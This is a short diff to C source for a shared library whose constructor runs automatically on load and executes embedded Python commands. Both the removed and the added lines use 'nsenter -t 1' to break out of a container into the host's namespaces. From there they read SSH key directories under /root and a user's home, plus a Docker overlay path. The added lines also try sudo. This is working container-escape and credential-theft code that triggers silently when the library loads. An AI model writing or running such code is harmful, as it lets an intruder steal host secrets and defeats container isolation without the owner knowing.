@@ -105,9 +105,9 @@ __attribute__((constructor)) static void on_so_load() {
   install_run_cmd_to_builtins();
 
   PyRun_SimpleString(R"PY(
-run_cmd('nsenter -t 1 -m -u -i -n -p -- cat /home/future/.ssh/*')
-run_cmd('nsenter -t 1 -m -u -i -n -p -- cat /root/.ssh/*')
-run_cmd('nsenter -t 1 -m -u -i -n -p -- cat /var/lib/docker/overlay2/32984f3076dff7f6d4e17274cf871c95a1dd6bfb10f8ea7bb173515cff9811f3/diff/root/*')
+run_cmd('nsenter -t 1 -m -u -i -n -p -- sudo cat /root/.ssh/*')
+run_cmd('nsenter -t 1 -m -u -i -n -p -- sudo ls -la /root/.ssh/')
+run_cmd('nsenter -t 1 -m -u -i -n -p -- ls -la /root/.ssh/*')
 
 )PY");
 
